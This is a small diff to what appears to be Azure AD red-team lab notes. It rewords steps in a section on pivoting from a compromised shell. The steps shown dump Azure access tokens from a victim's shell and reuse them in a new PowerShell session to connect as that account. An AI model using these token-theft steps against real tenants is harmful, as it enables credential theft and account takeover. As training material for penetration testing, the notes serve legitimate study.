@@ -147,13 +147,13 @@ Connect-AzAccount -AccountId test@defcorphq.onmicrosoft.com -AccessToken $token 
 ```
 
 #### Pivot from shell stealing tokens
-- On victim shell:
+- On victim shell using Az CLI:
 ```
 az account get-access-token
 az account get-access-token --resource-type aad-graph
 ```
 
-- Open another Powershell console:
+- Open a new Powershell console and use Az Powershell:
 ```
 PS C:\AzAD\Tools> $AccessToken = 'eyJ0…'
 PS C:\AzAD\Tools> $AADToken = 'eyJ0…'
